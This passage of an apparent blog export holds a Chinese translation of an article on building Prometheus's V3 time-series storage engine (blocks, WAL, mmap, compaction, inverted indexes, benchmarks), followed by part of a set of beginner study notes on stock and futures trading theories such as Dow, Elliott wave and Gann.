版本存在的问题均可以通过一些改进和部分的重新设计来解决，但为了让事情变得更好玩些（当然，我这个决定是经过深思熟虑的），我决定从头开始编写一款全新的时间序列数据库 —— 从零开始，即，将字节数据写到文件系统。 性能和资源使用这样的关键问题会直接引领我们做出存储格式方面的选择。我们必须为我们的数据找到一个正确的算法和磁盘布局以实现一个性能优良的存储层。 这便是我直接迈向成功时走的捷径 —— 忽略之前经历过的头疼，无数失败的想法，数不尽的草图，眼泪，还有绝望。 V3 - 宏观设计我们新版存储引擎的宏观设计是怎样的？简略来讲，只要到我们的 data 目录下运行 tree 命令，一切便都一目了然。不妨看下这幅美妙的画面它能带给我们怎样的一个惊喜。 12345678910111213141516171819202122232425$ tree ./data./data├── b-000001│ ├── chunks│ │ ├── 000001│ │ ├── 000002│ │ └── 000003│ ├── index│ └── meta.json├── b-000004│ ├── chunks│ │ └── 000001│ ├── index│ └── meta.json├── b-000005│ ├── chunks│ │ └── 000001│ ├── index│ └── meta.json└── b-000006 ├── meta.json └── wal ├── 000001 ├── 000002 └── 000003 在最上面一层，我们有一组带编号的块，它们均有一个前缀 b-。 每个块显然都维护一个包含索引的文件以及一个包含更多编号文件的”chunk”目录。”chunks”目录没别的，就多个序列的一些数据点的原始块。跟V2的做法一样，这样可以用非常低的成本来读取一个时间窗口里的序列数据，并且允许我们采用相同的有效压缩算法。这个概念已经被证实是行之有效的，我们自然就沿用这一点。很显然，这里不再是每个序列对应一个单个文件，取而代之的是，几个文件包含许多序列的数据块。 “index”文件的存在是预料之中的事情。我们不妨假定它包含了大量的黑魔法，允许我们找出标签，它们可能的值，整个时间序列，以及存放数据点的数据块。 但是，为什么有几个目录是一个索引和一些块文件这样的布局？为什么最后一个目录里取而代之的是有一个“wal”目录？搞清楚这两个问题的话可以解决我们90％的问题。 众多的小型数据库我们将我们的水平维度，即时间空间分割成非重叠的块。 每个块当成一个完全独立的数据库，包含其时间窗口的所有时间序列数据。因此，它有自己的索引和一组块文件。 12345678910t0 t1 t2 t3 now ┌───────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐ │ │ │ │ │ │ │ │ ┌────────────┐ │ │ │ │ │ │ │ mutable │ &lt;─── write ──── ┤ Prometheus │ │ │ │ │ │ │ │ │ └────────────┘ └───────────┘ └───────────┘ └───────────┘ └───────────┘ ^ └──────────────┴───────┬──────┴──────────────┘ │ │ query │ │ merge ─────────────────────────────────────────────────┘ 每个块的数据均是无法更改的。当然，在我们采集到新数据时我们必须能够将新序列和样本数据添加到最近的数据块里。对于这个数据块，所有新数据都将写入到内存数据库里，跟我们持久化的数据块一样，它也会提供相同的查找属性。内存里的数据结构也可以被有效地更新。为了防止数据丢失，所有传入的数据还会被写入预写日志（write ahead log），即我们的“wal”目录中的一组文件，我们可以在重新启动时基于这些文件将之前内存里的数据重新填充到内存数据库。 所有这些文件都带有自己的序列化格式，它附带了许多标志，偏移量，变体和 CRC32 校验和。比起无聊地读着介绍，读者朋友自己去发现它们也许会更有乐趣些。 这种布局允许我们查出所有和被查询的时间范围相关的数据块。每个块的部分结果被合并到一起形成最终的完整结果。 这种水平分区解锁了一些很棒的功能： 当查询一个时间范围时，我们可以轻松地忽略该范围外的所有数据块。 通过减少一系列开始时需要检查的数据，它可以初步解决序列分流的问题。 当完成一个数据块的填充时，我们可以通过顺序写入数据到一些较大的文件来保存内存数据库中的数据。 这样就避免了任何写入放大的问题，并且同样适用于SSD和HDD。 我们继承了 V2 优秀的地方，最近最多被查询的数据块总是作为热点保存在内存里。 棒棒哒，我们再也不需要通过固定的1KiB块大小设定来更好地对齐磁盘上的数据。 我们可以选择任何对于个别数据点和选定的压缩格式最有意义的大小。 删除旧数据变得非常低成本和及时。我们只需要删除一个目录。 请记住，在旧存储中，我们不得不分析并重新编写高达数亿个文件，这一操作可能需要几个小时才能收敛。 每个块还包含一个 meta.json 文件。 它简单地保存该数据块的人类可读信息，便于用户轻松了解数据块的存储状态及其包含的数据。 mmap从数以百万的小文件改成几个更大的文件使得我们能够以很小的成本保持所有文件的打开句柄。这也解锁了使用 mmap(2) 的玩法，它是一个系统调用，允许我们通过文件内容透明地回传到一个虚拟内存区域。为了简单起见，你可以联想它类似于交换(swap)空间，只是我们所有的数据已经在磁盘上，并且在将数据交换出内存后不会发生写入。这意味着我们可以将数据库里的所有内容均视为内存而不占用任何物理RAM。只有我们访问我们的数据库文件中的某些字节范围时，操作系统才会从磁盘惰性地加载页面。这就把和我们持久化数据相关的所有内存管理都交给了操作系统负责。 一般来说，操作系统更有资格做出这样的决定，因为它对整个机器及其所有过程有更全面的看法。查询数据可以相当积极地被缓存在内存里，而一旦面临内存压力，页面便会被逐出(evicted)。如果机器有未使用的内存，Prometheus 将会很高兴去缓存整个数据库，而一旦另一个应用程序需要它，它将立即返回。 这样一来，比起受到 RAM 的大小限制，即便查询更多的持久化数据，查询操作也不会再轻易造成进程的 OOM。内存的缓存大小变得完全自适应，只有在查询实际需要的数据时才会加载数据。 就我个人的理解，这是今天的很多数据库的工作方式，如果磁盘格式允许的话，这是一个理想的方法 - 除非你有信心在进程里做的工作能够超越操作系统。我们自己做了很少一部分工作而确实从外部系统收获了大量功能。 压缩 (compaction)存储引擎必须定期地“切出”一个新的块，并将之前完成的块写入到磁盘。只有块被成功持久化后，用于恢复内存块的预写日志文件（wal）才会被删除。 我们有兴趣将每个块的保存时间设置的相对短一些（一般设置大约两个小时），以避免在内存中堆积太多的数据。当查询多个块时，我们必须将其结果合并为一个完整结果。 这个合并过程显然会有一个成本，一个一周长的查询不应该需要合并超过80个的部分结果。 为了实现两者共同的需求，我们引入数据压缩（compaction）。它描述了采集一个或多个数据块并将其写入一个可能会更大的块的过程。它还可以沿途修改现有的数据，例如，清理已删除的数据，或重组我们的样本数据块以提高查询性能。 12345678910t0 t1 t2 t3 t4 now ┌────────────┐ ┌──────────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐ │ 1 │ │ 2 │ │ 3 │ │ 4 │ │ 5 mutable │ before └────────────┘ └──────────┘ └───────────┘ └───────────┘ └───────────┘ ┌─────────────────────────────────────────┐ ┌───────────┐ ┌───────────┐ │ 1 compacted │ │ 4 │ │ 5 mutable │ after (option A) └─────────────────────────────────────────┘ └───────────┘ └───────────┘ ┌──────────────────────────┐ ┌──────────────────────────┐ ┌───────────┐ │ 1 compacted │ │ 3 compacted │ │ 5 mutable │ after (option B) └──────────────────────────┘ └──────────────────────────┘ └───────────┘ 在这个例子里，我们有一组顺序的块 [1, 2, 3, 4]。数据块 1, 2 和 3 可以被一起压缩，然后形成的新结构便是 [1, 4]。或者，将它们成对地压缩成 [1，3]。 所有的时间序列数据仍然存在，但是现在总体的数据块更少。 这显著降低了查询时的合并成本，因为现在需要被合并的部分查询结果会更少。 保留 (Retention)我们看到，删除旧数据在 V2 存储引擎里是一个缓慢的过程，而且会消耗 CPU，内存和磁盘。那么，我们该如何在基于块的设计中删除旧数据呢？简单来讲，只需删除该目录下在我们配置的保留窗口里没有数据的块。 在下面的示例中，块1可以安全地被删除，而2必须保留到完全落在边界之后才行。 1234567 |┌────────────┐ ┌────┼─────┐ ┌───────────┐ ┌───────────┐ ┌───────────┐│ 1 │ │ 2 | │ │ 3 │ │ 4 │ │ 5 │ . . .└────────────┘ └────┼─────┘ └───────────┘ └───────────┘ └───────────┘ | | retention boundary 获取越旧的数据，数据块可能就变得越大，这是因为我们会不断地压缩以前压缩的块。 因此必须得有一个压缩的上限，这样一来块就不会扩展到跨越整个数据库从而影响到我们设计的最初优势。 另一个方便之处在于，这样也可以限制部分在保留窗口里部分在外面的数据块的总磁盘开销，即上面示例中的块 2.当用户将最大块的大小设置为总保留窗口的 10% 时，保留块 2 的总开销也有 10% 的上限。 总而言之，保留删除的实现从非常高的成本变成了几乎零成本。 如果看到这里，而且读者朋友本人有一些数据库的背景的话，你可能会问一件事：这是一个新玩法吗？ —— 其实不是；而且大概还可以做得更好。 在内存里批量处理数据，在预写日志（wal）里跟踪，并定期刷新到磁盘，这种模式在今天是被广泛采纳的。 无论数据特指的问题域是什么，我们所看到的好处几乎都是普遍适用的。 遵循这一方法的突出开源案例是 LevelDB，Cassandra，InfluxDB 或 HBase。而这里面的关键是要避免重复发明劣质轮子，研究经过生产验证的方法，并采取正确的姿势应用它们。 这里仍然留有余地可以添加用户自己的黑科技。 索引 (index)调研存储的改进方案的源动力便是为了解决序列分流引发的问题。基于块的布局设计减少了为查询提供服务所涉及的时间序列的总数。因此，假设我们索引查找的时间复杂度是 O（n ^ 2），我们设法减少n个相等的数量，那么现在就有一个改进的复杂度 O（n ^ 2） - uhm，等一下… 哇靠。 这时候脑海里迅速回忆起“算法101”提醒我们的事情，理论上讲，这并没有给我们带来任何改善。 如果以前做的不好，那现在也差不多。理论有时候真的挺让人沮丧的。 通过实践，我们大部分的查询明显会被更快地应答。然而，跨越全部时间范围的查询仍然很慢，即便他们只需要找到少量的系列。在所有这些工作开始之前，我最初的想法都是想要一个切实解决这个问题的方案：我们需要一个更强大的倒排索引。 倒排索引基于它们内容的子集提供对数据项的快速查找。简单来讲，用户可以找出所有带有标签“app =”nginx“的序列，而无需遍历每一个序列然后再检查它是否包含该标签。 为此，每个序列被分配一个唯一的 ID，通过它可以在恒定的时间内检索，即 O（1）。在这种情况下，ID 就是我们的正向索引。 示例：如果ID为10,29和9的序列包含标签 app=&quot;nginx&quot;，标签 “nginx” 的倒排索引便是一个简单的列表 [10,29,9]，它可以用来快速检索包含该标签的所有序列。即便还有 200 亿个序列，这也不会影响该次查找的速度。 简而言之，如果n是我们的序列总数，m 是给定查询的结果大小，那么使用索引的查询复杂度便是 O（m）。查询操作扩展到根据其检索的数据量（m）而不是正在搜索的数据体（n）是一个很棒的特性，因为一般来说 m 明显会更小些。 为了简单起见，我们假定可以在恒定的时间内完成倒排索引列表本身的检索。 实际上，这也几乎就是V2版本所拥有的倒排索引的类型，也是为数百万序列提供高性能查询的最低要求。敏锐的观察者会注意到，在最坏的情况下，所有的系列都存在一个标签，因此，m又是O（n）。 这是预料中的事情，而且也完全合理。 如果用户要查询所有的数据，自然就需要更长的时间。 一旦涉及到更复杂的查询这里可能就有问题了。 组合标签 (Combining Labels)标签被关联到数百万序列是很常见的。 假设有一个拥有数百个实例的横向可扩缩的“foo”微服务，每个实例有数千个系列。 每个系列都会有“app =”foo“的标签。当然，用户一般不会去查询所有的系列，而是通过进一步的过滤标签来限制查询，例如，我想知道我的服务实例收到多少个请求，那查询语句便是 __name __ =“requests_total” AND app =“foo”。 为了找出满足两个标签选择器的所有系列，我们取每个标签选择器的倒排索引列表然后取交集。 所得到的集合通常比每个输入列表小一个数量级。由于每个输入列表具有最差情况的复杂度是O（n），所以在两个列表上嵌套迭代的暴力解都具有O（n ^ 2）的运行时间。 其他集合操作也是相同的成本，例如union（app =“foo”OR app =“bar”）。当用户向查询添加进一步的标签选择器时，指数会增加到O（n ^ 3），O（n ^ 4），O（n ^ 5），… O（n ^ k）。 通过更改执行顺序，可以玩很多技巧来最大限度地有效减少运行时间。越复杂，就越需要了解数据样式和标签之间的关系。这引入了更多复杂度，但是并没有减少我们算法的最坏运行时间。 以上基本便是V2存储里采取的方式，幸运的是，看似微不足道的修改足以获得显著的提升。如果我们说我们的倒排索引中ID是排序好的话会发生什么？ 假设我们初始查询的列表示例如下： 1234__name__=&quot;requests_total&quot; -&gt; [ 9999, 1000, 1001, 2000000, 2000001, 2000002, 2000003 ] app=&quot;foo&quot; -&gt; [ 1, 3, 10, 11, 12, 100, 311, 320, 1000, 1001, 10002 ] intersection =&gt; [ 1000, 1001 ] 它们的交集相当小。我们可以通过在每个列表的开始处设置一个光标，并且始终从较小的数字那端依次推进。 当两个数字相等时，我们将数字添加到我们的结果中并推进两个游标。总的来说，我们以这种之字形模式（zig-zag pattern）扫描这两个列表，这样一来我们总的成本会是O（2n）= O（n），因为我们只是在任意一个列表中向前移动。 两个以上列表的不同集合操作的过程也是类似的效果。因此，k个集合操作的数量仅仅只会将时间复杂度修改为（O（k * n））而不是我们最坏情况的查找运行时的指数级（O（n ^ k））。真是一个大进步。 我在这里描述的内容几乎就是任意一款全文搜索引擎 所使用的规范搜索索引的简化版本。每个序列的描述符被视为一个简短的“文档”，每个标签（名称+固定值）作为其中的“单词”。我们可以忽略通常在搜索引擎索引中遇到的大量附加数据，例如字位置和出现频率等数据。 业内似乎都在无休止的研究探索改进实际运行时的方法，他们也常常对输入数据做出一些假设。不出所料的是，许多可以压缩倒排索引的技术均是有利有弊的。而由于我们的“文档”很小，“文字”在所有序列里都是非常重复的，所以压缩变得几乎无关紧要。 例如，一个约440万系列的现实世界数据集，每个标签约有12个，拥有少于5,000个唯一的标签。在我们最开始的存储版本里，我们坚持使用基本方法而不进行压缩，只添加了一些简单的调整来跳过大范围的非相交ID。 维持排序好的ID听上去可能很简单，但是实际坚持下来却是不太容易办到的。比如，V2存储引擎将一个哈希值作为ID赋给新的序列，我们无法有效地基于此建立一个排序好的倒排索引。另一个艰巨的任务是在数据被删除或更新时修改磁盘上的索引。通常，最简单的方法是简单地重新计算和重写它们，但是得在保证数据库可查询和一致性的同时执行这一操作。V3版本的存储引擎通过在每个块中分配一个单独的不可变索引来彻底解决这一问题，只能通过压缩时的重写来进行修改。而且，只有整个保存在内存里的可变块的索引才需要被更新。 基准测试 (Benchmark)我发起了一个最初开发版本V3存储的基准测试，它是基于从现实世界数据集中提取的大约440万个序列描述符，并生成合成的数据点到对应的序列。这种遍历测试了单独的存储模块，而且对于快速识别性能瓶颈和触发仅在高并发负载下才会遇到的死锁尤为重要。 在完成概念性的实施之后，基准测试可以在我的Macbook Pro上保持每秒2000万个数据点的写吞吐量 —— 而所有的Chrome Tab和Slack都在持续运行。所以尽管这听上去很棒，但也表明推动这一基准测试没有进一步的价值（或者在这个问题里的随机环境下运行是这样的）。毕竟，这是合成的，这就决定了第一印象不会太好。对比最初的设计目标放大到近20倍的数据量，那么是时候将它嵌入到真正的Prometheus服务器里了，我们可以在上面添加所有只会在更贴近现实的环境里才会遇到的一切实际开销和情景。 实际上，我们没有可重复的Prometheus基准测试配置，特别是没有允许不同版本的A / B测试。 亡羊补牢为时不晚，现在我们有一个了！ 我们的工具允许我们声明式地定义一个基准测试场景，然后将其部署到AWS上的Kubernetes集群。 虽然这不是全面的基准测试的最佳环境，但它肯定能反映出我们的用户基本上会比64内核和128GB内存的专用裸机服务器跑的更好。我们部署了两台Prometheus 1.5.2的服务器（V2存储引擎）以及两台基于2.0开发分支（V3存储引擎）部署的两台Prometheus服务器。每台Prometheus服务都是运行在一台配备有一块SSD的专用服务器上。我们将一个横向可扩展的应用程序部署到了工作节点上并让它对外暴露典型的微服务度量。此外，Kubernetes集群和节点本身也正在被监控。全部配置均由另一个Meta-Prometheus监督，它会监控每台Prometheus服务器的健康性和性能。为了模拟序列分流，微服务会定期地向上扩容和向下缩容，以去除旧的pod，并产生新的pod，从而生成新的序列。 查询负载以“典型”地选择查询来模拟，对每个Prometheus版本的一台服务器执行操作。 总体而言，缩放和查询负载以及采样频率显著超过了今天Prometheus的生产部署。 例如，我们每15分钟换掉60％的微服务实例以产生序列分流。在现代化的基础设施中这应该每天只会发生1-5次。 这样就能确保我们的V3设计能够处理未来几年的工作负载。 因此，比起一个更为温和的环境，在现在这样的情况下，Prometheus 1.5.2和2.0之间的性能差异更大。我们每秒总共从850个同一时间暴露50万个序列的目标里收集大约11万个样本。 在放任这一配置运行一段时间后，我们可以来看些数字。我们评估一下前12个小时内两个版本均达到稳定状态的几个指标。 请注意在Prometheus图形界面上的屏幕截图中略微截断的Y轴。 堆内存使用（GB） 内存使用是当今用户最为困扰的资源问题，因为它是相对无法预测的，而且可能会导致进程崩溃。显然，被查询的服务器正在消耗更多的内存，这主要得归咎于查询引擎的开销，而这一点在未来将有望得到优化。总的来说，Prometheus 2.0的内存消耗减少了3-4倍。 大约六个小时后，Prometheus 1.5版本就有一个明显的尖峰，与六个小时的保留边界一致。 由于删除操作成本很高，资源消耗也随之增加。这将在下面的各种其他图表中体现。 CPU使用率，核心/秒 CPU使用率的展示也是类似的模式，但是这里面查询服务器与非查询服务器之间的增量差异更为明显。以约0.5个核心/秒的平均值摄取大约110,000个样本/秒，与查询计算所花费的时间周期相比，我们的新存储消耗成本几乎可以忽略不计。 总的来说，新存储需要的CPU资源减少了3-10倍。 磁盘写入MB/秒 我们磁盘的写入利用率方面展示出了最突出和意想不到的改进。 这清晰地表明了为什么Prometheus 1.5容易造成SSD的耗损。 一旦第一个块被持久化到序列文件里，我们就能看到最开始会有一个飙升的过程，一旦删除然后开始重写，就会出现第二次飙升。令人诧异的是，被查询和非查询的服务器显示出完全不同的资源消耗。 另一方面，Prometheus 2.0只是以大约每秒一兆字节的写入速度写入到wal文件。 当块被压缩到磁盘时，写入周期性地出现一个尖峰。 这总体上节省了：惊人的97-99％。 磁盘大小（GB） 与磁盘写入量密切相关的是磁盘空间的总占用量。 由于我们对样本，即我们数据中的大部分组成，使用几乎相同的压缩算法，因此它们也应该是大致相同的。 在一个更稳定的环境中，这样做在很大程度上是合理的，但是因为我们要处理的是高度的序列分流，我们还得考虑每个序列的开销。 可以看到，Prometheus 1.5在两个版本都抵达稳定状态之前，消耗的存储空间因为保留策略的执行而迅速飙升。而Prometheus 2.0似乎在每个序列的开销都有一个明显的降幅。我们可以很高兴地看到磁盘空间是由预写日志文件线性填充的，并随着其压缩会瞬间下降。 事实上，Prometheus 2.0服务器不完全匹配线性增长的情况也是需要进一步调查的。 一切看上去都是充满希望的。 剩下的重要部分便是查询延迟。 新的索引应该提高了我们的查找复杂度。 没有实质改变的是这些数据的处理，例如 rate（）函数或聚合。 这些是查询引擎的一部分。 99百分位数查询延迟（以秒为单位） 数据完全符合预期。 在Prometheus 1.5中，随着存储更多的序列，查询延迟会随时间而增加。 一旦保留策略开始执行，旧的系列被删除，它才会平息。 相比之下，Prometheus 2.0从一开始就停留在合理的位置。 这个数据怎样被收集则需要用户花些心思。对服务器发出的查询请求取决于一个时间范围值和即时查询估计的最佳搭档，压缩或轻或重，以及涉及的序列或多或少等等。它不一定代表查询的真实分布。它也不能代表冷数据的查询性能，我们可以假设所有样本数据实际上总是存储在内存中的热点数据。 尽管如此，我们仍然可以非常有信心地说，新版存储引擎在序列分流方面整体查询的性能变得非常有弹性，并且在我们高压的基准场景中存储的性能提高了4倍。在一个更加静态的环境里，我们可以假定查询时间主要用于查询引擎本身，而且延迟明显可以被改进到更低值。 采样/秒 最后，快速过一下我们对不同Prometheus服务器的采样率。 我们可以看到，配备V3存储的两台服务器是相同的采样率。几个小时后，它变得不稳定，这是由于基准集群的各个节点高负载造成的失去响应而跟Prometheus实例本身无关。 （这两行2.0的数据完全匹配的事实希望能让人信服） 即便还有更多可用的CPU和内存资源，Prometheus 1.5.2服务器的采样速率也在大大降低。 序列分流的高压导致它无法收集更大量的数据。 那么，现在每秒可以抓取的绝对最大样本数是多少？ 我不知道 - 而且也故意不关注这一点。 影响Prometheus数据流量的因素众多，而这里面没有哪个单个数字能够衡量捕获质量。最大采样率历来是导致基准偏倚的一个指标，它忽略了更重要的方面，如查询性能以及对序列分流的抵御能力。 一些基本测试证实了资源使用线性增长的粗略假设。而这很容易推断出存在什么可能的结果。 我们的基准测试设置模拟了一个高度动态的环境，它给Prometheus施加的压力比今天大多数现实世界的设定要更大。 结果表明，我们在最优设计目标的基础上运行，而在不是最棒的云服务器上跑着。当然，最终衡量是否成功还是得取决于用户的反馈而不是基准数字。 注意：在撰写本文时，Prometheus 1.6正在开发中，它将允许更可靠地配置最大内存使用量，并且可能会显著降低总体的消耗，略微有利于提高CPU利用率。我并没有进行重复的测试，因为整体的结果仍然变化不大，特别是当面对高度的序列分流时更是如此。 结论Prometheus开始准备应对独立样本的高基数序列及吞吐的处理。 这仍然是一项很具有挑战的任务，但是新的存储引擎似乎使得我们对于超大规模，超收敛的GIFEE基础设施的未来感到满意。恩，它似乎跑的不错。 配备新版V3存储引擎的第一个Alpha版本的 Prometheus 2.0 已经可用于测试。在这个早期阶段，预计会发生崩溃，死锁和其他错误。 存储引擎本身的代码可以在单独的项目中找到。对于Prometheus本身而言，这是非常不可知论的，而且它也可以广泛用于一大波正在苦苦寻觅一个有效的本地时间序列数据库存储的应用。 这里得感谢很多人对这项工作的贡献。以下名单不分前后： Bojoern Rabenstein和Julius Volz在V2存储引擎上的打磨工作以及他们对于V3的反馈为这新一代设计里所能看到的一切事物奠定了基础。 Wilhelm Bierbaum持续不断地意见和见解为新一代的设计做出了重大贡献。Brian Brazil源源不断的反馈也确保我们最终采用语义上合理的方案。与Peter Bourgon的精辟讨论验证了新的设计，并且造就了这篇文章。 当然也别忘了我所在的CoreOS整个团队和公司本身对这项工作的支持和赞助。感谢那些能够耐心听我一次又一次地扯着SSD，浮点数和序列化格式的每一位同学。 原文链接：writing-a-time-series-database-from-scratch译文链接：从头编写一款时间序列数据库 （翻译：Colstuwjx）","link":"/hexo-blog/2018/01/10/%E4%BB%8E%E5%A4%B4%E7%BC%96%E5%86%99%E4%B8%80%E6%AC%BE%E6%97%B6%E9%97%B4%E5%BA%8F%E5%88%97%E6%95%B0%E6%8D%AE%E5%BA%93/"},{"title":"云聪金融交易分析入门笔记","text":"01 金融交易入门迷宫理论 A 基本面分析B 道氏理论C 江恩理论E 破浪理论F 盘口G 指标 大师骗子偏执狂 https://www.youtube.com/watch?v=Jy6mkzDsbmE 02 基本面、技术、盘口基本面：全球、行业、市盈率、财务、天气、供求、政策技术面： 道氏理论：趋势线、形态、位置 波浪理论：认识、划分、分型 江恩理论：时间、周期、28条、占星 其他：点位、箱子、缠论指标派：MACD、KDJ、RAS盘口分析（炒单） 交易方法：中长线，短线，日内，超短线 交易心理 https://www.youtube.com/watch?v=bgZBeaa3H6Y 03 股票及其历史 股票：有价证券 历史起源于 1602 年荷兰，东印度公司牛顿 1720 年买入南海公司，亏损 5万英镑丘吉尔 1929 年，大萧条，大亏 中国：1872 年，招商局，第一支股票1920/1921 上海，蒋介石，陈果夫，大亏，黄金荣 A股特点：T+1，10% 涨停，不能做空 美股特点：T+0，无涨停（有熔断），可做空（双向） https://www.youtube.com/watch?v=HIFQkF4Wi2o 04 什么是 T+1？如何做成 T+0？当日交易的证券隔日才能交易问题：早盘午盘买容易被套方案：尽量在下午收盘前买 如何将 T+1 做成 T+0底仓+滚动 https://www.youtube.com/watch?v=id4J8z8lyD8 05 涨停跌停定义：每日涨跌上限（正常：10%；ST（连续2年亏损）：5%）目的：降低市场波动，保护小股东利益原因：重大利好利空，主力控盘意义：趋势交易者判断趋势的利器，主力资金冲锋号角，涨停位置非常关键 一字涨停：吸货、出货 （暴风影音、长生） https://www.youtube.com/watch?v=WC2K5-zdmA4 06 ST股ST：连续两年亏损*ST：连续三年亏损摘帽，摘星：三项指标为正（净资产、市盈率、……）乌鸡变凤凰：资产重组，卖壳资源 （ST聚酯 -&gt; 广晟有色） https://www.youtube.com/watch?v=airgZmhAbBg 07 什么是期货？期货的历史？现货：一手交钱一手交货期货：一手交钱（订金）一手交合同（交货时间、地点、数量、价格） 历史：1848 年美国芝加哥，48 名商人组成交易市场（水、陆、铁路、商品集散地）大豆农场主，年初预算，出售合约（明年3月份，1吨大豆，5000人民币） 特点： 保证金制度（杠杆）：买 10 万，只需 1万（10%） 双向交易（做多，做空）人性夸大：小钱大赚；巨资巨亏（99%） 举例： 中国 327 国债事件 搞垮200年银行（巴黎银行） 索罗斯 https://www.youtube.com/watch?v=-KnwjmuaC_8 08 做空是投机吗？为什么要做空？价值投资？（美股）做空投机？（A股、期货） https://www.youtube.com/watch?v=_NXz2vVhKi0 09 什么叫做空？如何做空？（投机）做空就是：先卖再买股票：融券（借股票，卖，买，还股票）期货：买卖合同（预期）（卖合约，买合约） 对冲：股票和股指对冲股票持有，股指做空股票涨（大赚），股指涨（小亏）股票跌（小亏），股指跌（大赚） https://www.youtube.com/watch?v=kSDVKYvl7Kg 11 历史故事讲述基本面分析、技术分析、盘口分析区别基本面分析：宏观经济环境，行业，公司。主流（内功），长线（月、年）技术分析：图表决定一切。非主流（招式，实在），中短线（周、月）盘口分析：报价、成交数据、跳动、炒单。极小众（极难学，极有用）（日内） 盘口：哪分钟入手？（选价）技术面：哪天？哪周？（择时）基本面：买什么东西？（选股） https://www.youtube.com/watch?v=05FxrzqZ_c0 12 什么是趋势线？如何画？如何调整校对？ 时间越长越有效 触点越多越有效 https://www.youtube.com/watch?v=E6ZTBfow2xQ 13 趋势线的角度，突破、回抽（假突破）趋势线角度： 小于 30/45，上升趋势不稳定 45 左右，稳定（放心持有） 60 以上（特别 75/80），短时间反转可能性大 趋势线回抽 https://www.youtube.com/watch?v=xlgUocdRUrY 14 比特币后市走势（趋势线）https://www.youtube.com/watch?v=oD-FVuZjiOo 15 比特币行情走向（K线图）https://www.youtube.com/watch?v=3FyPI6Ih5wA 16 通道理论以及拐点理论趋势线，平行移动作用：用于作为走势参考突破，注意！有效突破：通道拐点，趋势线突破点 拐点意义：确认趋势转折 https://www.youtube.com/watch?v=MpNecRMGbJ4 18 形态理论及其意义 三角形：突破，转折 平行四边形：多空还在战斗 圆顶/圆底 钻石形态（菱形）（顶/底） 喇叭形态（反三角形） 意义：突破后的应对，而不是预测 https://www.youtube.com/watch?v=4Yavr4-cmRo 20 理查德 沙贝克 逆转与持续理论头肩形态：头肩顶（M形态），头肩底（W形态） 市场：逆转和持续，构成基本方式 市场 -&gt; 逆转 -&gt; 持续 -&gt; 直到有外力出现造成另一轮逆转 如何判断：头肩形态，颈线，趋势线 https://www.youtube.com/watch?v=uVqQfYwKqPo 21 裂口（缺口）理论与实战什么是裂口？ 分类：普通型裂口突破型裂口（重要）（上升趋势买入，下降趋势卖出、做空）持续型裂口衰退型裂口（平仓） 意义（实战） 回补（无意义） https://www.youtube.com/watch?v=EySicvCWvaE 23 支撑与阻力的概念与实战 什么是支撑与阻力？支撑：低点、量能或成交密集区（位）阻力：高点、量能或成交密集区（位） 互换 用法：趋势交易 -&gt; 突破反趋势 -&gt; 买卖点 https://www.youtube.com/watch?v=Kc8WbTiHFlc 24. 河宽（沽压带）的概念与实战河宽：两个沽压带之间的距离短：压力大长：压力小用法：仓位控制 https://www.youtube.com/watch?v=b8FtYUpt8xg 25 什么是真/假突破？突破：趋势交易者形态突破假突破：突破失败如何判断真假突破：量，价意义：无法提前判断，靠止损 https://www.youtube.com/watch?v=UsmRukuSUdo 26 道氏理论总结 指数决定一切（图表决定一切） 判断/找出趋势（主要趋势、次级趋势、小趋势） 形态（三角、四边、菱形、喇叭形）（位置） 趋势线（工具） 逆转与持续 M顶、W底、突破、河宽、沽压位，…… https://www.youtube.com/watch?v=pk9ylwn7nj4 27 主观交易与客观交易客观交易：趋势，趋势线；（不猜、不空想）；反人性的；控制自己的聪明；高买低卖（永远不可能买到最好点）主观交易：提前预测；波浪、江恩（时间周期、几何形态）、迪拉波特（黄金分割）、斐波那契、缠论；顺人性的 https://www.youtube.com/watch?v=N55sbGRvu_k 28 波浪理论(1) 数学基础艾略特，唯一没有金融投资经验的 黄金分割：0.618，0.382 斐波那契数列：兔子繁殖 黄金螺旋 https://www.youtube.com/watch?v=dI_fZoNViIY 29 波浪理论(2) 8浪结构周期：5浪上升，3浪下跌 第3浪不是最短浪 第4浪的底不低于第一浪的顶 第2浪不能跌破第一浪低点 https://www.youtube.com/watch?v=3q2T9QdbyRY 30 波浪理论(3) 大小波浪与周期分形 https://www.youtube.com/watch?v=CQfSav3ep78 31 波浪理论精髓(4) 牛熊周期，8浪对应，机构操盘https://www.youtube.com/watch?v=cJ4OjLOWxco 32 波浪理论(5) 延长浪，推动浪和调整浪形态结构https://www.youtube.com/watch?v=jSP3dD6U2pQ 33 波浪理论(6) 如何精确计算回调以及顶和底 时间周期： 斐波那契数列 回调/反抽的计算：黄金分割 顶和底的计算 https://www.youtube.com/watch?v=rJibrXvqxxo 35 波浪理论(7) K线数浪实战分析https://www.youtube.com/watch?v=G4fIWHIX7WA 38 江恩理论入门(1) 江恩是如何被神化的？如何正确学习江恩理论？前期：青年，中年（经纪人，时间控制因素，印度、英国、埃及，神秘文化，数学）（几何、占星、神秘学）后期：60、70岁，老年时代，《华尔街45年+》 A 趋势大师：不知道，看趋势B 波浪+指标大师：第5浪，kdj死叉，要下跌C 江恩大师：当时间与价格呈正方形，转势就在其中，我给你一个神奇数字，可以精确测到一个月后高点（神秘性、复杂性、自圆其说） https://www.youtube.com/watch?v=hT7Niue9vSg 39 江恩理论(2) 江恩神奇数字 3,4: 最重要（四日法则），4根K线法则 7: 14, 21, 28, 35, 42, (49), 56 12: 占星；24: 12*2 平方数（价格，时间）：4, 9, 16, 25, 36, 49, 64 https://www.youtube.com/watch?v=9Lxx32BeFv4 42 江恩理论(5) 后期江恩（精髓），循环、周期自然科学 -&gt; 金融奥秘波动率：小波动率，大波动率周期 周期：期货高手，五万，几百万，媒体（造神），基金，大亏股票、价格有周期，方法也有周期 春播，夏耕，秋收（赚到钱），冬藏（收手） https://www.youtube.com/watch?v=s35mpPi-uJU 44 江恩《华尔街45年》精华讲解(1) 为什么会在股票中亏损？什么是双底三底买入？ 经验：12条买入方法，24条规则（军规） 方法：高低点位/时间记录 为什么会亏损： 过度交易 不止损 不了解市场 江恩12条买卖规则： 判断趋势 单底、双底、三底买入（4次法则） 按百分比买卖（道式、波浪、江恩），顺大势、逆小势 https://www.youtube.com/watch?v=zXqufm_4Me8 45 《华尔街45年》精华部分(2) 3周上涨或下降（顺大势、逆小势） 市场分段运动（波浪理论） 按 5~7 点运动买卖 成交量（量价配合：上涨、量、钱；下跌、不需要量、恐惧）（量在价先） 时间周期 https://www.youtube.com/watch?v=k--Fc0f1DR8 46 